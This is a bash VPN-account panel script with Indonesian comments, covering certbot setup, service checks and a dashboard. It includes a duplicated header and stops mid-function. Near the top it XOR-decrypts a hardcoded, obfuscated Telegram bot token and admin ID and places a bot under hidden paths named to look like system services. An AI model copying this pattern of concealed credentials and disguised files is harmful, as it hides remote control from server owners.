#!/bin/bash
# ============================================================
# VPN PANEL — FULL STANDALONE
# Sumber: Youzin Crabz Tunel v3.12.0
# Single file — boleh push ke GitHub
# ============================================================

# --- Colors ---
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[0;33m'
CYAN='\033[0;36m'; WHITE='\033[0;37m'; DIM='\033[2m'
BOLD='\033[1m'; NC='\033[0m'

# --- Paths & Config ---
DOMAIN_FILE="/root/domain"; DOMAIN_TYPE_FILE="/root/domain_type"
WEB_DOMAIN_FILE="/root/domain_web"
AKUN_DIR="/root/akun"; PUBLIC_HTML="/var/www/html"
XRAY_CONFIG="/usr/local/etc/xray/config.json"
SYSTEM_INFO_CACHE="/tmp/.vpn_system_cache"; SYSINFO_CACHE_TTL=30
VPS_FILE="/root/.svc_reg"
SSH_PORT="22"; DROPBEAR_PORT="222"
NGINX_PORT="80"; NGINX_DL_PORT="81"; NGINX_SSL_PORT="443"
XRAY_VMESS_WS="8080"; XRAY_VLESS_WS="8081"; XRAY_TROJAN_WS="8082"
XRAY_VMESS_GRPC="8444"; XRAY_VLESS_GRPC="8445"; XRAY_TROJAN_GRPC="8446"
BADVPN_RANGE="7100-7300"
PRICE_MONTHLY="10000"; DURATION_MONTHLY="30"
_bot_dec() { echo "$1" | base64 -d 2>/dev/null | python3 -c "import sys; k='Y0uz1nCr4bzTun3l!'; d=sys.stdin.buffer.read(); print(''.join(chr(d[i]^ord(k[i%len(k)])) for i in range(len(d))), end='')" 2>/dev/null; }
TUNNELBOT_TOKEN=$(_bot_dec "YQJETAVZckAGWkAVNCZCARYwRxY3QCsyPl4MEGYjK0IlQAN3IytFNzoha1YxYA==")
TUNNELBOT_ADMIN=$(_bot_dec "YQBEQwRYe0oBUA==")

# --- Validasi ---
validate_username() {
    local u="$1"; [[ -z "$u" ]] && { echo "Username tidak boleh kosong"; return 1; }
    [[ ${#u} -lt 3 ]] && { echo "Minimal 3 karakter"; return 1; }
    [[ ${#u} -gt 32 ]] && { echo "Maksimal 32 karakter"; return 1; }
    [[ "$u" =~ [^a-z0-9_-] ]] && { echo "Hanya huruf kecil, angka, -, _"; return 1; }
    return 0
}
validate_password() {
    local p="$1"; [[ -z "$p" ]] && { echo "Password tidak boleh kosong"; return 1; }
    [[ ${#p} -lt 6 ]] && { echo "Minimal 6 karakter"; return 1; }
    [[ ${#p} -gt 64 ]] && { echo "Maksimal 64 karakter"; return 1; }
    return 0
}
validate_days() {
    local d="$1"; [[ -z "$d" ]] && return 1
    [[ ! "$d" =~ ^[0-9]+$ ]] && return 1
    [[ "$d" -lt 1 || "$d" -gt 365 ]] && return 1
    return 0
}
validate_iplimit() {
    local i="$1"; [[ -z "$i" ]] && return 1
    [[ ! "$i" =~ ^[0-9]+$ ]] && return 1
    [[ "$i" -lt 1 || "$i" -gt 254 ]] && return 1
    return 0
}
validate_domain() {
    local d="$1"; [[ -z "$d" ]] && return 1
    [[ "$d" =~ ^[a-zA-Z0-9]([a-zA-Z0-9-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9-]*[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}$ ]] && return 0
    return 1
}

# --- Error handling & helpers ---
require_root() {
    [[ $EUID -ne 0 ]] && { echo -e "${RED}Harus dijalankan sebagai root!${NC}" >&2; exit 1; }
}
safe_read() {
    local prompt="$1" var_name="$2"
    while true; do
        read -rp "$prompt" "$var_name"
        [[ -n "${!var_name}" ]] && break
        echo -e "  ${RED}✘ Input tidak boleh kosong${NC}"
    done
}
log_info() { echo -e "  ${CYAN}[INFO]${NC} $1"; }
log_ok()   { echo -e "  ${GREEN}[OK]${NC}   $1"; }
log_warn() { echo -e "  ${YELLOW}[WARN]${NC} $1"; }
log_err()  { echo -e "  ${RED}[ERR]${NC}  $1" >&2; }
fatal()    { log_err "$1"; exit 1; }
get_ip()   { curl -4 -s ifconfig.me 2>/dev/null || ip -4 addr show | grep -oP 'inet \K[\d.]+' | grep -v '^127' | head -1; }

_mysql_exec() {
    local user="$1" pass="$2" db="$3" f rc
    f=$(mktemp /tmp/mysql.cnf.XXXXXX)
    cat > "$f" <<CNF
[client]
user=$user
password=$pass
CNF
    chmod 600 "$f"
    shift 3
    mysql --defaults-extra-file="$f" "$@"
    rc=$?
    rm -f "$f"
    return $rc
}


# ============================================================
# CORE FUNCTIONS (dari vpn.sh 1-32063)
# ============================================================
#!/bin/bash



#================================================



# SHELLCHECK: Rule suppressions below are intentional



# - SC2059/SC2086: ANSI color codes & box-drawing



#   variables are always alphanumeric, never user input



# - SC2034: Port/documentation constants kept for reference



# - SC2015: && || is idiomatic bash short-circuit pattern



#   (all branches are simple, side effects are intentional)



# - SC1091: /etc/os-release is system file, always present



# - Others: Style preferences that don't affect functionality



#================================================



# shellcheck disable=SC1091,SC2002,SC2012,SC2015,SC2016,SC2034,SC2059,SC2086



# shellcheck disable=SC2119,SC2120,SC2126,SC2129,SC2155,SC2181,SC2183,SC2188



# shellcheck disable=SC2206,SC2207











#================================================



# Youzin Crabz Tunel



# The Professor



# GitHub: putrinuroktavia234-max/Tunnel



# Version: 3.12.0 FINAL — OrderVPN Web Integrated, Multi-VPS, OTP Email, Trial, Full Admin



#================================================







RED='\033[0;31m'



GREEN='\033[0;32m'



YELLOW='\033[1;33m'



BLUE='\033[0;34m'



CYAN='\033[0;36m'



PURPLE='\033[0;35m'



WHITE='\033[1;37m'



BOLD='\033[1m'



DIM='\033[2m'



NC='\033[0m'







DOMAIN=""



DOMAIN_FILE="/root/domain"



IP_CACHE_FILE="/root/.ip_vps"



AKUN_DIR="/root/akun"



XRAY_CONFIG="/usr/local/etc/xray/config.json"



DDOS_CONFIG="/root/.ddos_rules"



TRAFFIC_DIR="/root/traffic"



XRAY_LOCK_FILE="/root/.xray_config.lock"
SCRIPT_VERSION="3.12.0"
SCRIPT_AUTHOR="The Professor"
GITHUB_USER="putrinuroktavia234-max"
GITHUB_REPO="Tunnel"
GITHUB_BRANCH="main"
SCRIPT_URL="https://raw.githubusercontent.com/${GITHUB_USER}/${GITHUB_REPO}/${GITHUB_BRANCH}/vpn.sh"
VERSION_URL="https://raw.githubusercontent.com/${GITHUB_USER}/${GITHUB_REPO}/${GITHUB_BRANCH}/version"

# OrderVPN Web Release (auto-updated by build.sh)
ORDERVPN_VERSION="3.12.0"
ORDERVPN_TAR_URL="https://github.com/${GITHUB_USER}/${GITHUB_REPO}/releases/download/v${ORDERVPN_VERSION}/ordervpn-src.tar.gz"
ORDERVPN_TAR_SHA256="c978f16e644542582942926cb39cd2f9c0fa4bc32f6da8aefb9005dc3c86d9e6"



SCRIPT_PATH="/root/vpn.sh"



BACKUP_PATH="/root/vpn.sh.bak"



PUBLIC_HTML="/var/www/html"



USERNAME="YouzinCrabz"



BOT_TOKEN_FILE="/root/.bot_token"



CHAT_ID_FILE="/root/.chat_id"



ORDER_DIR="/root/orders"



PAYMENT_FILE="/root/.payment_info"



DOMAIN_TYPE_FILE="/root/domain_type"



SYSTEM_INFO_CACHE="/root/.sysinfo_cache"



IP_CACHE_TTL=600



SYSINFO_CACHE_TTL=30







# TunnelBot Multi-VPS



TUNNELBOT_DIR="/opt/.sysd"



TUNNELBOT_FILE="/opt/.sysd/svc-main.py"



TUNNELBOT_TOKEN=$(_bot_dec "YQJETAVZckAGWkAVNCZCARYwRxY3QCsyPl4MEGYjK0IlQAN3IytFNzoha1YxYA==")



TUNNELBOT_ADMIN=$(_bot_dec "YQBEQwRYe0oBUA==")



VPS_FILE="/root/.svc_reg"







#================================================



# PORT VARIABLES



#================================================



SSH_PORT="22"



DROPBEAR_PORT="222"



NGINX_PORT="80"



NGINX_DL_PORT="81"



NGINX_SSL_PORT="443"



XRAY_VMESS_WS="8080"



XRAY_VLESS_WS="8081"



XRAY_TROJAN_WS="8082"



XRAY_VMESS_GRPC="8444"



XRAY_VLESS_GRPC="8445"



XRAY_TROJAN_GRPC="8446"



BADVPN_RANGE="7100-7300"



PRICE_MONTHLY="10000"



DURATION_MONTHLY="30"







#================================================



# UBUNTU COMPATIBILITY LAYER



#================================================







detect_ubuntu_version() {



    UBUNTU_VER="unknown"



    UBUNTU_MAJOR=0



    if [[ -f /etc/os-release ]]; then



        source /etc/os-release



        UBUNTU_VER="${VERSION_ID:-unknown}"



        UBUNTU_MAJOR="${VERSION_ID%%.*}"



    fi



}







# Deteksi apakah berjalan di container (OpenVZ/LXC)



detect_container() {



    IS_CONTAINER=0



    if [[ -f /proc/1/environ ]]; then



        if grep -q "container=lxc" /proc/1/environ 2>/dev/null; then IS_CONTAINER=1; fi



    fi



    if systemd-detect-virt --container &>/dev/null; then IS_CONTAINER=1; fi



}







# Install certbot sesuai Ubuntu version



install_certbot_compat() {



    local domain_type="${1:-custom}"



    [[ "$domain_type" != "custom" ]] && return 0







    detect_ubuntu_version



    detect_container







    # Jika sudah ada certbot yang berfungsi, skip



    if command -v certbot >/dev/null 2>&1; then



        return 0



    fi







    echo -e "  ${CYAN}Installing certbot...${NC}"







    # Pastikan apt tidak locked



    _wait_apt_lock







    # Ubuntu 22+: pakai certbot dari apt universe



    # Ubuntu 20: pakai apt, fallback snap jika bukan container



    # Container: snap tidak support, wajib apt



    if [[ "$UBUNTU_MAJOR" -ge 22 ]]; then



        # Ubuntu 22/24: pastikan universe enabled, install certbot



        add-apt-repository -y universe >/dev/null 2>&1 || true



        DEBIAN_FRONTEND=noninteractive apt-get install -y certbot >/dev/null 2>&1 || true



    elif [[ "$IS_CONTAINER" -eq 1 ]]; then



        DEBIAN_FRONTEND=noninteractive apt-get install -y certbot >/dev/null 2>&1 || true



    else



        # Ubuntu 20 bare metal: coba apt dulu, fallback snap



        if ! DEBIAN_FRONTEND=noninteractive apt-get install -y certbot >/dev/null 2>&1; then



            if command -v snap >/dev/null 2>&1; then



                snap install --classic certbot 2>/dev/null && \
                    ln -sf /snap/bin/certbot /usr/bin/certbot 2>/dev/null || true



            fi



        fi



    fi







    command -v certbot >/dev/null 2>&1



}







# Tunggu apt lock bebas (max 60 detik)



_wait_apt_lock() {



    local i=0



    while fuser /var/lib/dpkg/lock-frontend >/dev/null 2>&1 || \
          fuser /var/lib/apt/lists/lock >/dev/null 2>&1; do



        if [[ $i -eq 0 ]]; then



            echo -e "  ${YELLOW}Menunggu apt lock bebas...${NC}"



        fi



        sleep 2; ((i++))



        [[ $i -ge 30 ]] && break



    done



    # Kill unattended-upgrades yang mungkin lock



    if [[ $i -ge 30 ]]; then



        systemctl stop unattended-upgrades 2>/dev/null || true



        sleep 2



    fi



}







# Cek apakah iptables atau nftables



detect_firewall_backend() {



    if command -v nft >/dev/null 2>&1 && nft list tables 2>/dev/null | grep -q .; then



        FW_BACKEND="nftables"



    else



        FW_BACKEND="iptables"



    fi



}







# pip install yang kompatibel semua Ubuntu



pip_install() {



    local pkg="$1"



    detect_ubuntu_version



    # Ubuntu 22+ (PEP 668): pip3 butuh --break-system-packages untuk install global



    if [[ "$UBUNTU_MAJOR" -ge 22 ]]; then



        pip3 install "$pkg" --break-system-packages -q 2>/dev/null || \
        pip3 install "$pkg" -q 2>/dev/null || true



    else



        pip3 install "$pkg" -q 2>/dev/null || \
        pip3 install "$pkg" --break-system-packages -q 2>/dev/null || true



    fi



}







# Nama service SSH yang benar (Ubuntu 22+ pakai ssh, Ubuntu 20 pakai sshd)



get_ssh_service_name() {



    if systemctl list-units --type=service 2>/dev/null | grep -q "^  ssh\.service"; then



        echo "ssh"



    elif systemctl list-units --type=service 2>/dev/null | grep -q "^  sshd\.service"; then



        echo "sshd"



    else



        echo "ssh"



    fi



}







# Restart service dengan validasi dulu



restart_service_safe() {



    local svc="$1"



    local validate_cmd="${2:-}"







    # Jalankan validasi config dulu jika ada



    if [[ -n "$validate_cmd" ]]; then



        if ! $validate_cmd >/dev/null 2>&1; then



            echo -e "  ${RED}✘ Config error pada ${svc}! Skip restart.${NC}"



            $validate_cmd 2>&1 | head -5 | sed 's/^/    /'



            return 1



        fi



    fi







    if systemctl is-enabled --quiet "$svc" 2>/dev/null || \
       systemctl is-active --quiet "$svc" 2>/dev/null; then



        systemctl restart "$svc" 2>/dev/null



        sleep 1



        if systemctl is-active --quiet "$svc" 2>/dev/null; then



            return 0



        else



            echo -e "  ${RED}✘ ${svc} gagal start!${NC}"



            journalctl -u "$svc" -n 5 --no-pager 2>/dev/null | sed 's/^/    /'



            return 1



        fi



    fi



    return 0



}







# curl/wget dengan timeout



safe_curl() {



    curl -fsSL --max-time 30 --retry 2 --retry-delay 3 "$@"



}







safe_wget() {



    wget -q --timeout=30 --tries=2 "$@"



}







#================================================



# SEPARATOR THEME — Mobile Friendly, Always Symmetric



#================================================







# Lebar fixed 54 — pas untuk layar HP semua ukuran



get_width() { echo 66; }







# _slen: hitung panjang string setelah strip ANSI codes



_slen() { printf "%b" "$1" | sed 's/\x1b\[[0-9;]*m//g' | tr -d '\n' | wc -m | tr -d ' '; }







# Buat n karakter berulang



_rep() {



    local c="$1" n=$2 r=""



    while [ $n -gt 0 ]; do r="${r}${c}"; n=$((n-1)); done



    printf "%s" "$r"



}







# Garis separator penuh



_box_top()     { printf "${CYAN}$(_rep '━' $1)${NC}\n"; }



_box_bottom()  { printf "${CYAN}$(_rep '━' $1)${NC}\n"; }



_box_divider() { printf "${CYAN}$(_rep '─' $1)${NC}\n"; }







# Teks tengah



_box_center() {



    local W=$1 text="$2"



    local tlen; tlen=$(_slen "$text")



    local lpad=$(( (W-tlen)/2 )); [ $lpad -lt 0 ] && lpad=0



    printf "%${lpad}s%b\n" "" "$text"



}







# Teks kiri dengan indent 2 spasi



_box_left() {



    printf "  %b\n" "$2"



}







# Two-column: selalu simetris, lebar kolom sama



_box_row() {



    local W=$1 l="$2" r="$3"



    local col=$(( (W-2)/2 ))



    printf "  %-${col}s%-${col}s\n" "$l" "$r"



}







# Mini (untuk sub-menu) — sama persis, tidak ada perbedaan indent



_mini_top()     { _box_top "$1"; }



_mini_bottom()  { _box_bottom "$1"; }



_mini_divider() { _box_divider "$1"; }



_mini_center() { _box_center "$1" "$2"; }



_mini_left()    { _box_left "$1" "$2"; }



_mini_row()     { _box_row "$1" "$2" "$3"; }







# _mini_two: dua kolom dengan teks ber-ANSI



_mini_two() {



    local W=$1 left="$2" right="$3"



    local col=$(( (W-2)/2 ))



    local llen; llen=$(_slen "$left")



    local rlen; rlen=$(_slen "$right")



    local lpad=$(( col - llen )); [ $lpad -lt 0 ] && lpad=0



    local rpad=$(( col - rlen )); [ $rpad -lt 0 ] && rpad=0



    printf "  %b%${lpad}s%b%${rpad}s\n" "$left" "" "$right" ""



}







_ram_bar() {



    local pct=$1 len=12 f e bar=""



    f=$(( pct * len / 100 )); e=$(( len - f ))



    local i=0; while [ $i -lt $f ]; do bar="${bar}█"; i=$((i+1)); done



    i=0; while [ $i -lt $e ]; do bar="${bar}░"; i=$((i+1)); done



    printf "%s" "$bar"



}







#================================================



# ANIMASI & PROGRESS



#================================================







spinner_frames=('⣾' '⣽' '⣻' '⢿' '⡿' '⣟' '⣯' '⣷')



bar_frames=('▱▱▱▱▱▱▱▱▱▱' '▰▱▱▱▱▱▱▱▱▱' '▰▰▱▱▱▱▱▱▱▱' '▰▰▰▱▱▱▱▱▱▱' '▰▰▰▰▱▱▱▱▱▱' '▰▰▰▰▰▱▱▱▱▱' '▰▰▰▰▰▰▱▱▱▱' '▰▰▰▰▰▰▰▱▱▱' '▰▰▰▰▰▰▰▰▱▱' '▰▰▰▰▰▰▰▰▰▱' '▰▰▰▰▰▰▰▰▰▰')







animated_loading() {



    local msg="$1" duration="${2:-2}" i=0 end=$((SECONDS+duration)) dots frame



    while [ $SECONDS -lt $end ]; do



        frame="${spinner_frames[$((i%8))]}"



        case $((i%4)) in 0) dots="   ";; 1) dots=".  ";; 2) dots=".. ";; 3) dots="...";; esac



        printf "\r  ${CYAN}${frame}${NC} ${WHITE}${msg}${NC}${YELLOW}${dots}${NC}   "



        sleep 0.1; i=$((i+1))



    done



    printf "\r  ${GREEN}✔${NC} ${WHITE}${msg}${NC} ${GREEN}[SELESAI]${NC}           \n"



}







show_progress() {



    local cur=$1 tot=$2 label="$3"



    local pct=$(( cur * 100 / tot ))



    local f=$(( cur * 10 / tot ))



    printf "\r  ${CYAN}[${NC}${GREEN}%s${NC}${CYAN}]${NC} ${WHITE}%3d%%${NC}  ${DIM}%s${NC}   " "${bar_frames[$f]}" "$pct" "$label"



    echo ""



}







#================================================



# BANNER INSTALL



#================================================







show_install_banner() {



    clear



    local W; W=$(get_width)



    echo ""



    _box_top $W



    _box_center $W "${YELLOW}${BOLD}✦  YOUZINCRABZ PANEL  ✦${NC}"



    _box_center $W "${CYAN}Script Auto Install${NC}"



    _box_center $W "${WHITE}Youzin Crabz Tunel${NC}"



    _box_center $W "${DIM}The Professor${NC}"



    _box_bottom $W



    echo ""



}







#================================================



# UTILITY FUNCTIONS



#================================================







check_status() { systemctl is-active --quiet "$1" 2>/dev/null && echo "ON" || echo "OFF"; }







get_ip() {



    # Cache dengan TTL 10 menit — lebih agresif



    if [ -f "$IP_CACHE_FILE" ]; then



        local cached cached_time now



        cached=$(tr -d '[:space:]' < "$IP_CACHE_FILE")



        # Ambil timestamp dari mtime file



        cached_time=$(stat -c %Y "$IP_CACHE_FILE" 2>/dev/null || echo 0)



        now=$(date +%s)



        # Jika cache masih fresh (< 10 menit) dan valid, pakai



        if [ $((now - cached_time)) -lt "$IP_CACHE_TTL" ]; then



            if echo "$cached" | grep -qE '^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$'; then



                for octet in $(echo "$cached" | tr '.' ' '); do



                    [ $((10#$octet)) -gt 255 ] && { cached=""; break; }



                done



                [ -n "$cached" ] && { echo "$cached"; return; }



            fi



        fi



    fi



    local ip



    # Deteksi IPv4 paksa (-4) untuk hindari IPv6



    for url in "https://ipinfo.io/ip" "https://api.ipify.org" "https://ifconfig.me" "https://checkip.amazonaws.com"; do



        ip=$(curl -4 -s --max-time 5 "$url" 2>/dev/null | tr -d '[:space:]')



        # Validasi format IPv4



        if echo "$ip" | grep -qE '^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$'; then



            local valid=true



            for octet in $(echo "$ip" | tr '.' ' '); do



                [ $((10#$octet)) -gt 255 ] && { valid=false; break; }



            done



            [ "$valid" = false ] && continue



            echo "$ip" > "$IP_CACHE_FILE"



            echo "$ip"



            return



        fi



    done



    # Fallback: deteksi IP lokal via routing



    ip=$(ip -4 route get 8.8.8.8 2>/dev/null | awk '{for(i=1;i<=NF;i++) if($i=="src"){print $(i+1);exit}}')



    if [ -n "$ip" ] && echo "$ip" | grep -qE '^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$'; then



        for octet in $(echo "$ip" | tr '.' ' '); do



            [ $((10#$octet)) -gt 255 ] && { ip=""; break; }



        done



        [ -n "$ip" ] && { echo "$ip" > "$IP_CACHE_FILE"; echo "$ip"; return; }



    fi



    echo "N/A"



}







send_telegram_admin() {



    [ -f "$BOT_TOKEN_FILE" ] && [ -f "$CHAT_ID_FILE" ] || return



    local token chatid; token=$(cat "$BOT_TOKEN_FILE"); chatid=$(cat "$CHAT_ID_FILE")



    curl -s -X POST "https://api.telegram.org/bot${token}/sendMessage" \
        -d chat_id="$chatid" -d text="$1" -d parse_mode="HTML" --max-time 10 >/dev/null 2>&1



}







#================================================



# HEADER & SECTION HELPERS



#================================================







print_menu_header() {



    local W; W=$(get_width)



    echo ""



    _box_top $W



    _box_center $W "${YELLOW}${BOLD}$1${NC}"



    _box_bottom $W



    echo ""



}







print_section() {



    local W; W=$(get_width)



    echo ""



    _box_divider $W



    echo -e "  ${CYAN}▸ ${WHITE}$1${NC}"



    _box_divider $W



    echo ""



}







#================================================



# DASHBOARD — TAMPILAN UTAMA



#================================================







# Baca CPU dari /proc/stat (jauh lebih cepat dari top -bn1)



_get_cpu_usage() {



    local idle1 total1 idle2 total2 diff_idle diff_total



    # Baca total dan idle dari baris pertama /proc/stat



    local cpu_line



    cpu_line=$(head -1 /proc/stat 2>/dev/null || echo "cpu 0 0 0 0 0 0 0 0 0 0")



    # user nice system idle iowait irq softirq steal guest guest_nice



    set -- $cpu_line



    shift # remove 'cpu'



    total1=$(( $1 + $2 + $3 + $4 + $5 + $6 + $7 + $8 ))



    idle1=$4



    sleep 0.1



    cpu_line=$(head -1 /proc/stat 2>/dev/null || echo "cpu 0 0 0 0 0 0 0 0 0 0")



    set -- $cpu_line



    shift



    total2=$(( $1 + $2 + $3 + $4 + $5 + $6 + $7 + $8 ))



    idle2=$4



    diff_idle=$(( idle2 - idle1 ))



    diff_total=$(( total2 - total1 ))



    if [ $diff_total -gt 0 ]; then



        echo $(( (100 * (diff_total - diff_idle)) / diff_total ))



    else



        echo "0"



    fi



}







# Batch systemctl check — 1 panggilan untuk semua service



_get_services_status() {



    if command -v systemctl >/dev/null 2>&1; then



        # Dapatkan semua service aktif dalam 1 panggilan



        local active_units



        active_units=$(systemctl list-units --type=service --state=running --no-legend --no-pager 2>/dev/null | awk '{print $1}' | tr '\n' '|')



        echo "$active_units"



    fi



}







show_system_info() {



    clear



    [ -f "$DOMAIN_FILE" ] && DOMAIN=$(tr -d '\n\r' < "$DOMAIN_FILE" | xargs)







    # ── CACHE CHECK: refresh hanya jika cache sudah expired ──



    local use_cache=0



    if [ -f "$SYSTEM_INFO_CACHE" ]; then



        local cache_time now



        cache_time=$(stat -c %Y "$SYSTEM_INFO_CACHE" 2>/dev/null || echo 0)



        now=$(date +%s)



        [ $((now - cache_time)) -lt "$SYSINFO_CACHE_TTL" ] && use_cache=1



    fi







    local os_name="Unknown"



    [ -f /etc/os-release ] && { . /etc/os-release; os_name="${PRETTY_NAME}"; }







    local ip_vps ram_used ram_total ram_pct cpu uptime_str ssl_type svc_running svc_total







    if [ $use_cache -eq 1 ]; then



        # Baca dari cache



        local cached_data



        cached_data=$(cat "$SYSTEM_INFO_CACHE" 2>/dev/null || echo "")



        if [ -n "$cached_data" ]; then



            source <(echo "$cached_data") 2>/dev/null || true



        else



            use_cache=0



        fi



    fi







    if [ $use_cache -eq 0 ]; then



        # Kumpulkan data (hanya sekali setiap 30 detik)



        ip_vps=$(get_ip)



        ram_used=$(free -m | awk '/Mem:/{print $3}')



        ram_total=$(free -m | awk '/Mem:/{print $2}')



        ram_pct=$(awk "BEGIN{printf \"%.0f\",($ram_used/$ram_total)*100}")



        cpu=$(_get_cpu_usage)



        uptime_str=$(uptime -p 2>/dev/null | sed 's/up //' | sed 's/ hours\?/h/g;s/ minutes\?/m/g')







        local domain_type="custom"



        [ -f "$DOMAIN_TYPE_FILE" ] && domain_type=$(cat "$DOMAIN_TYPE_FILE")



        if [ "$domain_type" = "custom" ]; then



            [ -f "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" ] && ssl_type="LetsEncrypt (Active)" || ssl_type="LetsEncrypt (Warn)"



        else



            ssl_type="Self-Signed"



        fi







        # Batch systemctl: 1 panggilan untuk semua service



        local active_units



        active_units=$(_get_services_status)



        local svcs=(xray nginx ssh haproxy dropbear udp-custom zivpn-udp vpn-keepalive vpn-bot)



        svc_total=${#svcs[@]}; svc_running=0



        for s in "${svcs[@]}"; do



            if echo "$active_units" | grep -q "${s}\.service|"; then



                svc_running=$((svc_running+1))



            fi



        done







        # Cache hasil ke file (termasuk active_units untuk service status)



        printf "ip_vps='%s'\nram_used='%s'\nram_total='%s'\nram_pct='%s'\ncpu='%s'\nuptime_str='%s'\nssl_type='%s'\nsvc_total='%s'\nsvc_running='%s'\nactive_units='%s'\n" \
            "$ip_vps" "$ram_used" "$ram_total" "$ram_pct" "$cpu" "$uptime_str" "$ssl_type" "$svc_total" "$svc_running" "$active_units" \
            > "$SYSTEM_INFO_CACHE" 2>/dev/null



    fi







    local ssh_count vmess_count vless_count trojan_count



    ssh_count=$(ls "$AKUN_DIR"/ssh-*.txt 2>/dev/null | wc -l)



    vmess_count=$(ls "$AKUN_DIR"/vmess-*.txt 2>/dev/null | wc -l)



    vless_count=$(ls "$AKUN_DIR"/vless-*.txt 2>/dev/null | wc -l)



    trojan_count=$(ls "$AKUN_DIR"/trojan-*.txt 2>/dev/null | wc -l)







    local BAR; BAR=$(_ram_bar "$ram_pct")



    local W; W=$(get_width)







    # ── HEADER ──



    echo ""



    _box_top $W



    _box_center $W "${YELLOW}${BOLD}✦  YOUZINCRABZ PANEL  ✦${NC}"



    _box_center $W "${CYAN}The Professor${NC}"



    _box_bottom $W



    echo ""







    # ── SERVER STATUS ──



    _box_top $W



    _box_center $W "${CYAN}${BOLD}SERVER CORE STATUS${NC}"



    _box_divider $W



    echo -e "  ${WHITE}IP Address${NC}  : ${GREEN}${ip_vps}${NC}"



    echo -e "  ${WHITE}Domain${NC}      : ${CYAN}${DOMAIN:-N/A}${NC}"



    echo -e "  ${WHITE}OS${NC}          : ${WHITE}${os_name}${NC}"



    echo -e "  ${WHITE}Uptime${NC}      : ${WHITE}${uptime_str}${NC}"



    echo -e "  ${WHITE}CPU Load${NC}    : ${YELLOW}${cpu}%${NC}"



    echo -e "  ${WHITE}RAM Usage${NC}   : ${WHITE}${ram_used} / ${ram_total} MB${NC} ${CYAN}[${BAR}]${NC} ${YELLOW}${ram_pct}%${NC}"



    echo -e "  ${WHITE}SSL Status${NC}  : ${GREEN}${ssl_type}${NC}"



    echo -e "  ${WHITE}Services${NC}    : ${GREEN}${svc_running}/${svc_total} Running${NC}"



    _box_bottom $W



    echo ""







    # ── ACTIVE ACCOUNTS ──



    _box_top $W



    _box_center $W "${CYAN}${BOLD}ACTIVE ACCOUNTS${NC}"



    _box_divider $W



    _box_center $W "SSH: ${GREEN}${ssh_count}${NC}  VMess: ${GREEN}${vmess_count}${NC}  VLess: ${GREEN}${vless_count}${NC}  Trojan: ${GREEN}${trojan_count}${NC}"



    _box_bottom $W



    echo ""







    # ── NETWORK SERVICES ──



    local xs xn hs dn ss un ks bt fb cj fw



    if [ -z "${active_units:-}" ]; then



        local active_units



        active_units=$(_get_services_status)



    fi



    _svc_on() { echo "$active_units" | grep -q "${1}\.service|"; }



    _svc_on xray          && xs="${GREEN}● ONLINE${NC}" || xs="${RED}○ OFFLINE${NC}"



    _svc_on nginx         && xn="${GREEN}● ONLINE${NC}" || xn="${RED}○ OFFLINE${NC}"



    _svc_on haproxy       && hs="${GREEN}● ONLINE${NC}" || hs="${RED}○ OFFLINE${NC}"



    _svc_on dropbear      && dn="${GREEN}● ONLINE${NC}" || dn="${RED}○ OFFLINE${NC}"



    local ssh_svc_name; ssh_svc_name=$(get_ssh_service_name)



    _svc_on "$ssh_svc_name" && ss="${GREEN}● ONLINE${NC}" || ss="${RED}○ OFFLINE${NC}"



    _svc_on udp-custom    && un="${GREEN}● ONLINE${NC}" || un="${RED}○ OFFLINE${NC}"



    _svc_on vpn-keepalive && ks="${GREEN}● ONLINE${NC}" || ks="${RED}○ OFFLINE${NC}"



    # Bot Telegram



    if [[ -f "$BOT_TOKEN_FILE" ]] && _svc_on vpn-bot; then



        bt="${GREEN}● ONLINE${NC}"



    elif [[ -f "$BOT_TOKEN_FILE" ]]; then



        bt="${YELLOW}● CONFIG${NC}"



    else



        bt="${RED}○ OFFLINE${NC}"



    fi



    # Fail2ban - langsung grep dari active_units



    if echo "$active_units" | grep -q "fail2ban\.service|"; then



        fb="${GREEN}● ONLINE${NC}"



    else



        fb="${RED}○ OFFLINE${NC}"



    fi



    # Cron auto-delete expired



    crontab -l 2>/dev/null | grep -q "delete_expired_cron" && \
        cj="${GREEN}● ONLINE${NC}" || cj="${RED}○ OFFLINE${NC}"



    # UFW Firewall



    if command -v ufw >/dev/null 2>&1; then



        ufw status 2>/dev/null | grep -qi "^Status: active" && \
            fw="${GREEN}● ONLINE${NC}" || fw="${RED}○ OFFLINE${NC}"



    else



        fw="${DIM}○ N/A   ${NC}"



    fi







    _box_top $W



    _box_center $W "${CYAN}${BOLD}NETWORK SERVICES${NC}"



    _box_divider $W



    _mini_two $W "${WHITE}XRAY${NC}      : ${xs}" "${WHITE}NGINX${NC}    : ${xn}"



    _mini_two $W "${WHITE}HAPROXY${NC}   : ${hs}" "${WHITE}DROPBEAR${NC} : ${dn}"



    _mini_two $W "${WHITE}SSH${NC}       : ${ss}" "${WHITE}UDP CUST${NC} : ${un}"



    _mini_two $W "${WHITE}KEEPALIVE${NC} : ${ks}" "${WHITE}BOT TG${NC}   : ${bt}"



    _mini_two $W "${WHITE}FAIL2BAN${NC}  : ${fb}" "${WHITE}CRON AUTO${NC}: ${cj}"



    _mini_two $W "${WHITE}FIREWALL${NC}  : ${fw}" ""



    _box_bottom $W



    echo ""



}







#================================================



# SHOW MAIN MENU



#================================================







show_menu() {



    local W; W=$(get_width)



    # Kolom menu: lebar setengah dari W, masing-masing kolom pakai format [XX] Label



    # [XX] = 4 char, spasi 1, label max ~22 char → total ~27 per kolom



    local col=$(( (W - 2) / 2 ))







    # Helper: buat 1 baris 2 kolom menu simetris dengan ANSI



    # _mrow col "NUM" "Label" "NUM" "Label"



    _mrow() {



        local c=$1 n1="$2" lb1="$3" n2="$4" lb2="$5"



        local left="${CYAN}[${n1}]${NC} ${WHITE}${lb1}${NC}"



        local right="${CYAN}[${n2}]${NC} ${WHITE}${lb2}${NC}"



        local llen; llen=$(printf "%b" "[${n1}] ${lb1}" | sed 's/\x1b\[[0-9;]*m//g' | wc -m | tr -d ' ')



        local rlen; rlen=$(printf "%b" "[${n2}] ${lb2}" | sed 's/\x1b\[[0-9;]*m//g' | wc -m | tr -d ' ')



    local lpad=$(( c - llen )); [ $lpad -lt 0 ] && lpad=0



